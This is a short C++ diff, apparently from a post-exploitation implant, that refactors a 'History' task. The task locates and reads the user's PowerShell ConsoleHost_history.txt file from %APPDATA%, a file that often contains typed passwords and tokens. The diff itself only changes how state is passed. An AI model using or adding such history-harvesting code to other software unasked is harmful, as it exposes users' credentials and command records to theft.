@@ -2,17 +2,17 @@
 
 namespace Task
 {
-    std::wstring History()
+    std::wstring History(State::PSTATE pState)
     {
         std::wstring result = L"";
 
         // Get env paths
-        std::wstring envAppData = System::Env::GetStrings(L"%APPDATA%");
-        std::wstring envLocalAppData = System::Env::GetStrings(L"%LOCALAPPDATA%");
+        std::wstring envAppData = System::Env::GetStrings(pState->pProcs, L"%APPDATA%");
+        std::wstring envLocalAppData = System::Env::GetStrings(pState->pProcs, L"%LOCALAPPDATA%");
 
         // Read PowerShell history file
         std::wstring wHistoryFile = envAppData + L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
-        std::vector<BYTE> historyBytes = System::Fs::ReadBytesFromFile(wHistoryFile);
+        std::vector<BYTE> historyBytes = System::Fs::ReadBytesFromFile(pState->pProcs, wHistoryFile);
         if (historyBytes.size() > 0)
         {
             result += wHistoryFile + L"\n";
